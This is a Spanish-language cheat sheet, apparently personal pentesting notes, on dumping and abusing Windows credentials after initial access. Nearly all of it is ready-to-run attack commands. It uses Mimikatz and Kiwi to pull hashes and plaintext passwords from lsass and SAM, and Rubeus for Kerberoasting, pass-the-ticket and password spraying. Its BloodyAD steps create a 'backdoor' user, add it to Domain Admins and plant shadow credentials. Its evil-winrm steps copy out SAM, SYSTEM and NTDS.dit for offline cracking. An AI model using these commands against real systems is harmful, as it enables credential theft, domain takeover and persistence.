
# Dumpear/volcar hashes de Windows

## Mimikazt

Es una herramienta de postexplotación para Windows, que permite extraer contraseñas en texto plano, hashes y tickets Kerberos en memoria.

La base de datos **SAM (Security Account Manager)** es un archivo de base de datos en los sistemas Windows que almacena las **contraseñas de usuario en formato hash**.

Mimikatz puede extraer **hashes de la memoria del proceso lsass.exe**, donde se almacenan en caché los hashes.

Para escalar privilegios:

```
meterpreter> pgrep lsass
meterpreter> migrate <PID>
meterpreter> getuid
```

Descargamos Mimikazt:

https://github.com/ParrotSec/mimikatz

Lo subimos en la víctima:

```
meterpreter> upload <ruta/mimikatz.exe>
```

Cambiar ahora de meterpreter a shell nativo de Windows y ejecutarlo:

```
C:\temp .\mimikatz.exe
```

Comprobar privilegios necesarios:

```
mimikatz # privilege::debug
```

Si devuelve 20 OK, es que tenemos permisos.

Para encontrar el contenido de caché del proceso lsass o los volcados de hash de SAM:

```
mimikatz # lsadump::sam
```

Se ve la clave SAM que puede ayudar a autenticarse a usuarios locales y remotos en windows, y algún hash NTLM.

Si tiene RID 500 es administrador.

También para más información:

```
mimikatz # lsadump::secrets
```

Muchos sistemas Windows (si están configurados así) almacenan las contraseñas de inicio de sesión en la memoria:

```
mimikatz # sekurlsa::logonpasswords
```

* Normalmente requiere de administrador
* Si estamos en una sesión con evil-winrm, es posible que tengamos que poner la palabra "exit" al final para que se ejecute todo el comando

```
C:\temp .\mimikatz.exe "privilege::debug" "exit"
```



## Kiwi

Podemos usar Mimikatz o si tenemos una sesión meterpreter, podemos usar Kiwi. Sin embargo, necesita privilegios NT-Authority para ejecutar la extensión Kiwi.

```
meterpreter> load kiwi
```

Para volcar todos los hashes:

```
meterpreter> creds_all
```

Para volcar la caché de la base de datos SAM o del proceso LSASS:

```
meterpreter> lsa_dump_sam
```

Buscar contraseñas en texto plano:

```
meterpreter> lsa_dump_secrets
```

Para buscar hashes NTLM y generar tickets:

```
golden_ticket_create
kerberos_ticket_list
kerberos_ticket_purge
kerberos_ticket_use
```

Recopilar hash NT de shell meterpreter:

```
meterpreter> hashdump
```


# Rubeus

Es una herramienta para moverse, escalar privilegios y robar credenciales dentro de un dominio.

Se usa cuando ya tienes un acceso inicial a una máquina del dominio, cuando ya tienes privs altos o SYSTEM para sacar tickets o en auditorías para ataques como Kerberoasting o AS-REP Roasting.

Listar tickets actuales:

```
Rubeus.exe dump
```

Kerberoasting (robar hashes de servicio):

```
Rubeus.exe kerberoast
```

Pass the ticket:

```
Rubeus.exe ptt /ticket:ticket.kirbi
```

Overpass the hash:

```
Rubeus.exe asktgt /user:<usuario> /rc4:<hash>
```

Este comando le dice a Rubeus que recolecte tickets TGT cada 30 segundos:

```
Rubeus.exe harvest /interval:30
```

Password spraying:

```
Rubeus.exe brute /password:<contraseña> /noticket
```

Esto tomará una contraseña dada y la “rociará” contra todos los usuarios encontrados y luego le dará el  TGT .kirbi  para ese usuario



Github: https://github.com/GhostPack/Rubeus

[ Acceso inicial a máquina en el dominio ]
             |
             v
     ┌───────────────────────────┐
     │   Recolección de Tickets  │
     └───────────────────────────┘
        dump → extraer tickets TGT/TGS de memoria
        harvest → seguir capturando tickets nuevos

             |
             v
     ┌───────────────────────────┐
     │  Ataques a contraseñas    │
     └───────────────────────────┘
        kerberoast → pedir TGS de SPN y crackear
        asreproast → usuarios sin preautenticación

             |
             v
     ┌───────────────────────────┐
     │  Movimiento lateral       │
     └───────────────────────────┘
        ptt (Pass-the-Ticket) → inyectar ticket robado
        asktgt (Overpass-the-Hash) → pedir TGT con hash

             |
             v
     ┌───────────────────────────┐
     │  Persistencia             │
     └───────────────────────────┘
        renew → renovar tickets existentes
        tgtdeleg → obtener TGT usando delegación



# BloodyAD

Instalar:

```
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip install -r requirements.txt
```

BloodyAD necesita credenciales o un método para autenticarse en el **Domain Controller (DC)**.

Usuario y contraseña:

```
bloodyAD -u "usuario" -p "contraseña" -d "DOMINIO.LOCAL" -dc-ip 192.168.1.10 <comando>
```

Pass the hash:

```
bloodyAD -u "usuario" -H "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c" -d "DOMINIO.LOCAL" -dc-ip 192.168.1.10 <comando>
```

Pass the ticket:

```
export KRB5CCNAME=/ruta/a/ccache
bloodyAD -k -d "DOMINIO.LOCAL" -dc-ip 192.168.1.10 <comando>
```

Permite enumeración:

|Comando|Ejemplo|Utilidad|
|---|---|---|
|**get user**|`bloodyAD ... get user jsmith`|Muestra atributos del usuario _jsmith_ (correo, grupos, SID, etc.).|
|**get group**|`bloodyAD ... get group "Domain Admins"`|Lista los miembros del grupo _Domain Admins_.|
|**get domain-controllers**|`bloodyAD ... get domain-controllers`|Enumera todos los controladores de dominio.|
|**get dns-records**|`bloodyAD ... get dns-records`|Obtiene registros DNS almacenados en AD.|
|**set password**|`bloodyAD ... set password jsmith "NuevaPass123!"`|Cambia la contraseña de un usuario, sin conocer la anterior (si tienes permisos).|
|**add user**|`bloodyAD ... add user backdoor "Pass123!"`|Crea un nuevo usuario en AD.|
|**add member**|`bloodyAD ... add member "Domain Admins" backdoor`|Añade un usuario a un grupo específico (ej. escalar privilegios).|
|**add shadow-credentials**|`bloodyAD ... add shadow-credentials jsmith`|Inserta credenciales ocultas (ataque de _Shadow Credentials_).|
|**set rbcd**|`bloodyAD ... set rbcd target_computer compromised_machine`|Configura Resource-Based Constrained Delegation (RBCD) para pivotar/controlar un equipo.|
|**remove member**|`bloodyAD ... remove member "Domain Admins" backdoor`|Elimina a un usuario de un grupo (limpieza de huellas).|
|**restore**|`bloodyAD ... restore CN=usuario,CN=Deleted Objects,DC=dominio,DC=local`|Restaura un objeto borrado (papelera de AD).|


# PEAS

`linpeas.sh` / `winPEAS.exe` (privesc)


# Evil-winrm

Si conseguimos acceso:

```
evil-winrm> reg save HKLM\system system
evil-winrm> reg save HKLM\sam sam
evil-winrm> download system
evil-winrm> download sam
```

SAM+SYSTEM = SAM DRCRYPTED

```
samdump2 system sam
```

o con impacket-secretsdump, o con secretsdump.py.

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Y luego, pero conseguirás un user local:

```
evil-winrm -i <IPoDOminio> -u '<user>' -H '<hash>' 
```


# Cracking NTDS.DIT

Si conseguimos acceso con Evil-winrm:

```
evil-winrm> download <ruta_ntds.dit>
```

```
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```



# Metasploit

# GTFobins

etc.